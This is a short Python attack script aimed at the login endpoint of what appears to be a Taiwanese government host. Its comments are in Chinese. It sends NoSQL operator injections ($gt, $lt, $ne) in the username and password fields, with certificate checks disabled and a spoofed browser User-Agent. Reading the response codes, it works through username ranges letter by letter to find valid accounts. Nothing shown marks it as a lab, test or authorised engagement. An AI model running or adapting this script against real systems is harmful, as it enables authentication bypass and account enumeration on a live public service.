import requests, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code
def count(lo,hi):
    body={"username":{"$and":[{"$gt":lo},{"$lt":hi}]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    return login(body)

print("=== 大写字母区细分 (A-Z 切 4 段) ===")
segs=[("A","D"),("D","G"),("G","J"),("J","M"),("M","P"),("P","S"),("S","V"),("V","Z")]
hits=[]
for lo,hi in segs:
    sc=count(lo,hi); time.sleep(0.05)
    flag="<== >=2" if sc==403 else ""
    print(f"  ({lo}..{hi}) -> {sc} {flag}")
    if sc==403: hits.append((lo,hi))
print(f"\n命中区间: {hits}")
